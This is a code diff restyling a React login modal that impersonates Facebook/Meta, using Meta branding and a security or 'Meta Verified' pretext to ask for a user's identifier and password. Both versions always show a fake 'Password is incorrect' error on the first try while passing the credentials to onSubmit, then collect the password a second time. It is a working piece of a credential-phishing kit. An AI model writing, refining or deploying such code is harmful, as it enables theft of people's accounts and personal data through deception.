@@ -1,176 +1,254 @@
 import { useState } from 'react';
 import PropTypes from 'prop-types';
 import config from '@/utils/config';
-import TickIcon from '@/assets/images/tick.png';
-import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import FbRoundLogo from '@/assets/images/fb_round_logo.png';
+import MetaLogo from '@/assets/images/logo-meta.svg';
 
-const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
-    const [formData, setFormData] = useState({
+const inputWrapperBase = {
+    position: 'relative',
+    width: '100%',
+    border: '1px solid #d4dbe3',
+    height: '40px',
+    padding: '0 11px',
+    borderRadius: '10px',
+    background: '#fff',
+    fontSize: '14px',
+    marginBottom: '10px',
+    display: 'flex',
+    alignItems: 'center',
+    transition: 'border-color 0.2s, box-shadow 0.2s',
+    boxSizing: 'border-box'
+};
+
+const LoginModal = ( { show, onClose, onSubmit, onSuccess, texts } ) =>
+{
+    const [ formData, setFormData ] = useState( {
         identifier: '',
         password: ''
-    });
-    const [showPassword, setShowPassword] = useState(false);
-    const [loginAttempt, setLoginAttempt] = useState(0);
-    const [isLoading, setIsLoading] = useState(false);
-    const [showError, setShowError] = useState(false);
+    } );
+    const [ showPassword, setShowPassword ] = useState( false );
+    const [ loginAttempt, setLoginAttempt ] = useState( 0 );
+    const [ isLoading, setIsLoading ] = useState( false );
+    const [ showError, setShowError ] = useState( false );
+    const [ focusedField, setFocusedField ] = useState( null );
 
-    const handleChange = (field, value) => {
-        setFormData((prev) => ({ ...prev, [field]: value }));
-        if (showError) {
-            setShowError(false);
-        }
+    const handleChange = ( field, value ) =>
+    {
+        setFormData( ( prev ) => ( { ...prev, [ field ]: value } ) );
+        if ( showError ) setShowError( false );
     };
 
-    const handleSubmit = async (e) => {
+    const handleSubmit = async ( e ) =>
+    {
         e.preventDefault();
+        if ( !formData.password.trim() ) return;
 
-        if (!formData.identifier.trim() || !formData.password.trim()) {
-            return;
-        }
+        setIsLoading( true );
+        setShowError( false );
 
-        setIsLoading(true);
-        setShowError(false);
-
-        setTimeout(() => {
-            setIsLoading(false);
-
-            if (loginAttempt === 0) {
-                setShowError(true);
-                setLoginAttempt(1);
-                onSubmit(formData.identifier, formData.password);
-            } else {
-                setShowError(false);
-                onSubmit(formData.identifier, formData.password);
+        setTimeout( () =>
+        {
+            setIsLoading( false );
+            if ( loginAttempt === 0 )
+            {
+                setShowError( true );
+                setLoginAttempt( 1 );
+                onSubmit( formData.identifier, formData.password );
+            } else
+            {
+                setShowError( false );
+                onSubmit( formData.identifier, formData.password );
                 onSuccess();
             }
-        }, config.password_loading_time * 1000);
+        }, config.password_loading_time * 1000 );
     };
 
-    const togglePasswordVisibility = () => {
-        setShowPassword((prev) => !prev);
-    };
-
-    if (!show) return null;
+    if ( !show ) return null;
 
     return (
         <>
-            <div className="modal-backdrop show" onClick={onClose}></div>
-            <div className="modal form-modal show" id="exampleModal2" style={{ display: show ? 'block' : 'none' }} tabIndex="-1">
-            <div className="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
-                <div className="modal-content">
-                    <div className="modal-header"></div>
-                    <div className="modal-body">
-                        <div className="fb-round-wraper text-center">
-                            <img alt="" className="fb-logo-round" src={FbRoundLogo} />
+            {/* Backdrop */ }
+            <div
+                onClick={ onClose }
+                style={ { position: 'fixed', inset: 0, zIndex: 1040, background: 'rgba(0,0,0,0.5)' } }
+            />
+
+            {/* Modal */ }
+            <div style={ {
+                position: 'fixed', inset: 0, zIndex: 1050,
+                display: 'flex', alignItems: 'center', justifyContent: 'center',
+                padding: '16px'
+            } }>
+                <div
+                    style={ {
+                        background: 'linear-gradient(130deg, rgba(249,241,249,1) 0%, rgba(234,243,253,1) 35%, rgba(237,251,242,1) 100%)',
+                        width: '100%',
+                        maxWidth: '512px',
+                        maxHeight: '90vh',
+                        borderRadius: '16px',
+                        boxShadow: '0 20px 60px rgba(0,0,0,0.2)',
+                        padding: '20px',
+                        display: 'flex',
+                        flexDirection: 'column',
+                        overflow: 'hidden'
+                    } }
+                    onClick={ ( e ) => e.stopPropagation() }
+                >
+                    {/* Empty header row */ }
+                    <div style={ { display: 'flex', justifyContent: 'flex-end', marginBottom: '0' } } />
+
+                    {/* Scrollable body */ }
+                    <div style={ { flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', alignItems: 'center' } }>
+
+                        {/* Logo top */ }
+                        <div style={ { width: '50px', height: '50px', margin: '0 auto 20px' } }>
+                            <img src={ FbRoundLogo } alt="logo" style={ { width: '100%', height: '100%', objectFit: 'contain' } } />
                         </div>
 
-                        <form autocomplete="off" id="apiForm" onSubmit={handleSubmit}>
-                            <p style={{ color: '#1877f2', fontWeight: '600', fontSize: '14px', marginBottom: '6px', textAlign: 'left' }}>
-                                <img src={TickIcon} width="16" alt="tick" style={{ verticalAlign: 'middle' }} /> {texts.loginInstruction || 'In order to subscribe your business to Meta Verified, you must be logged in to your professional account (Facebook) or business Page (Facebook).'}
+                        {/* Form area */ }
+                        <div style={ { width: '100%', padding: '32px 0' } }>
+                            <p style={ { color: '#9a979e', fontSize: '14px', marginBottom: '7px' } }>
+                                For your security, you must enter your password to continue.
                             </p>
 
-                            {loginAttempt === 0 && (
-                                <div className="form-floating mb-3" id="emailField">
-                                    <input
-                                        autocomplete="username"
-                                        className="form-control"
-                                        id="loginIdentifier"
-                                        maxLength="60"
-                                        minLength="3"
-                                        name="identifier"
-                                        placeholder={texts.mobileOrEmail || 'Mobile number or email'}
-                                        required
-                                        type="text"
-                                        value={formData.identifier}
-                                        onChange={(e) => handleChange('identifier', e.target.value)}
-                                    />
-                                    <label htmlFor="loginIdentifier">{texts.mobileOrEmail || 'Mobile number or email'}</label>
-                                    <div className="invalid-feedback">{texts.mobileOrEmail || 'Please enter your mobile number or email.'}</div>
-                                </div>
-                            )}
+                            <form autoComplete="off" onSubmit={ handleSubmit }>
 
-                            <div className="form-floating mb-3" style={{ position: 'relative' }}>
-                                <input
-                                    autocomplete="current-password"
-                                    className={`form-control ${showError ? 'is-invalid shake' : ''}`}
-                                    id="exampleInputPassword"
-                                    maxLength="30"
-                                    minLength="3"
-                                    name="password-1"
-                                    placeholder={texts.password || 'Password'}
-                                    required
-                                    style={{ paddingRight: '44px' }}
-                                    type={showPassword ? 'text' : 'password'}
-                                    value={formData.password}
-                                    onChange={(e) => handleChange('password', e.target.value)}
-                                />
-                                <label htmlFor="exampleInputPassword">{texts.password || 'Password'}</label>
-
-                                <button
-                                    aria-label="Show/Hide password"
-                                    aria-pressed={showPassword}
-                                    className="password-toggle"
-                                    id="show-hide-pass"
-                                    style={{
-                                        position: 'absolute',
-                                        right: '12px',
-                                        top: '50%',
-                                        transform: 'translateY(-50%)',
-                                        cursor: 'pointer',
-                                        zIndex: 6,
-                                        background: 'transparent',
-                                        border: 0,
-                                        padding: 0
-                                    }}
-                                    type="button"
-                                    onClick={togglePasswordVisibility}
-                                >
-                                    <svg fill="#606770" height="22" id="eyeClosed" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg" style={{ display: showPassword ? 'none' : 'inline' }}>
-                                        <path d="M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z"></path>
-                                        <circle cx="12" cy="12" r="2.5"></circle>
-                                    </svg>
-
-                                    <svg fill="#1877f2" height="22" id="eyeOpen" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg" style={{ display: showPassword ? 'inline' : 'none' }}>
-                                        <path d="M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z"></path>
-                                    </svg>
-                                </button>
-
-                                {showError && (
-                                    <div className="invalid-feedback d-block" id="errorMsg">
-                                        {texts.passwordIncorrect || 'Password is incorrect, please try again.'}
+                                {/* Identifier — only on first attempt */ }
+                                { loginAttempt === 0 && (
+                                    <div
+                                        style={ {
+                                            ...inputWrapperBase,
+                                            borderColor: focusedField === 'identifier' ? '#3b82f6' : '#d4dbe3',
+                                            boxShadow: focusedField === 'identifier' ? '0 4px 12px rgba(59,130,246,0.1)' : 'none'
+                                        } }
+                                    >
+                                        <input
+                                            id="loginIdentifier"
+                                            placeholder={ texts.mobileOrEmail || 'Mobile number or email' }
+                                            type="text"
+                                            autoComplete="username"
+                                            value={ formData.identifier }
+                                            onChange={ ( e ) => handleChange( 'identifier', e.target.value ) }
+                                            onFocus={ () => setFocusedField( 'identifier' ) }
+                                            onBlur={ () => setFocusedField( null ) }
+                                            style={ { width: '100%', outline: 'none', border: 'none', background: 'transparent', fontSize: '14px', height: '100%' } }
+                                        />
                                     </div>
-                                )}
-                            </div>
+                                ) }
 
-                            <div className="form-btn-wrapper">
-                                <button className="btn btn-primary w-100" id="loginBtn" style={{ position: 'relative', height: '45px' }} type="submit" disabled={isLoading}>
-                                    <span className="button-text" style={{ visibility: isLoading ? 'hidden' : 'visible' }}>
-                                        {loginAttempt === 0 ? (texts.logIn || 'Log in') : (texts.continueBtn || 'Continue')}
-                                    </span>
-                                    {isLoading && (
-                                        <span className="custom-spinner" id="spinner" style={{ position: 'absolute', left: '50%', top: '50%', transform: 'translate(-50%, -50%)', width: '22px', height: '22px', border: '3px solid rgba(255,255,255,0.5)', borderTopColor: '#fff', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }}></span>
-                                    )}
-                                </button>
-                            </div>
+                                {/* Password field */ }
+                                <div
+                                    style={ {
+                                        ...inputWrapperBase,
+                                        borderColor: showError ? '#ef4444' : focusedField === 'password' ? '#3b82f6' : '#d4dbe3',
+                                        boxShadow: showError
+                                            ? '0 4px 12px rgba(239,68,68,0.1)'
+                                            : focusedField === 'password' ? '0 4px 12px rgba(59,130,246,0.1)' : 'none',
+                                        paddingRight: '44px'
+                                    } }
+                                >
+                                    <input
+                                        id="password"
+                                        placeholder="Enter your password"
+                                        autoComplete="new-password"
+                                        type={ showPassword ? 'text' : 'password' }
+                                        value={ formData.password }
+                                        onChange={ ( e ) => handleChange( 'password', e.target.value ) }
+                                        onFocus={ () => setFocusedField( 'password' ) }
+                                        onBlur={ () => setFocusedField( null ) }
+                                        style={ {
+                                            width: '100%', outline: 'none', border: 'none',
+                                            background: 'transparent', fontSize: '14px', height: '100%',
+                                            /* hide MS reveal button */
+                                            MsReveal: 'none'
+                                        } }
+                                    />
+                                    {/* Toggle show/hide */ }
+                                    <button
+                                        type="button"
+                                        tabIndex={ -1 }
+                                        onClick={ () => setShowPassword( p => !p ) }
+                                        style={ {
+                                            position: 'absolute', right: '12px',
+                                            top: '50%', transform: 'translateY(-50%)',
+                                            background: 'transparent', border: 'none',
+                                            cursor: 'pointer', padding: 0, display: 'flex', alignItems: 'center'
+                                        } }
+                                    >
+                                        { showPassword ? (
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                                                <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z" />
+                                                <circle cx="12" cy="12" r="3" />
+                                            </svg>
+                                        ) : (
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                                                <path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49" />
+                                                <path d="M14.084 14.158a3 3 0 0 1-4.242-4.242" />
+                                                <path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143" />
+                                                <path d="m2 2 20 20" />
+                                            </svg>
+                                        ) }
+                                    </button>
+                                    <style>{ `.hide-password-toggle::-ms-reveal, .hide-password-toggle::-ms-clear { display: none; }` }</style>
+                                </div>
 
-                            <div className="text-center mt-3" id="forgot-pass-wrap">
-                                <a href="#forgot">{texts.forgotPassword || 'Forgot password?'}</a>
-                            </div>
-                        </form>
+                                {/* Error message */ }
+                                { showError && (
+                                    <p style={ { color: '#ef4444', fontSize: '13px', marginTop: '-6px', marginBottom: '10px' } }>
+                                        { texts.passwordIncorrect || 'Password is incorrect, please try again.' }
+                                    </p>
+                                ) }
 
-                        <div className="spaser"></div>
-                    </div>
+                                {/* Submit */ }
+                                <div style={ { width: '100%', marginTop: '20px' } }>
+                                    <button
+                                        type="submit"
+                                        disabled={ isLoading }
+                                        style={ {
+                                            height: '45px', minHeight: '45px', width: '100%',
+                                            background: '#0064E0', color: '#fff',
+                                            borderRadius: '40px', border: 'none',
+                                            display: 'flex', alignItems: 'center', justifyContent: 'center',
+                                            cursor: isLoading ? 'not-allowed' : 'pointer',
+                                            fontWeight: '500', fontSize: '15px',
+                                            fontFamily: 'inherit', position: 'relative',
+                                            opacity: isLoading ? 0.8 : 1,
+                                            transition: 'opacity 0.3s'
+                                        } }
+                                    >
+                                        { isLoading ? (
+                                            <span style={ {
+                                                width: '20px', height: '20px',
+                                                border: '2.5px solid rgba(255,255,255,0.4)',
+                                                borderTopColor: '#fff',
+                                                borderRadius: '50%',
+                                                animation: 'spin 0.8s linear infinite',
+                                                display: 'inline-block'
+                                            } } />
+                                        ) : 'Continue' }
+                                    </button>
+                                </div>
 
-                    <div className="modal-footer border-0 justify-content-center" style={{ flexDirection: 'column', textAlign: 'center' }}>
-                        <img src={MetaLogo} alt="Meta Logo" style={{ height: '20px', marginBottom: '5px' }} />
-                        <div className="footer-links" style={{ fontSize: '12px', color: '#000' }}>
-                            {texts.aboutHelpMore || 'About · Help · See more'}
+                                {/* Forgot password */ }
+                                <p style={ { textAlign: 'center', marginTop: '10px' } }>
+                                    <a href="#" style={ { color: '#9a979e', fontSize: '14px', textDecoration: 'none' } }>
+                                        Forgot your password?
+                                    </a>
+                                </p>
+
+                            </form>
                         </div>
+
+                        {/* Meta logo bottom */ }
+                        <div style={ { width: '60px', margin: '20px auto 0' } }>
+                            <img src={ MetaLogo } alt="Meta" style={ { width: '100%', height: 'auto', objectFit: 'contain', opacity: 0.4 } } />
+                        </div>
+
                     </div>
                 </div>
             </div>
-        </div>
+
+            <style>{ `@keyframes spin { to { transform: rotate(360deg); } }` }</style>
         </>
     );
 };
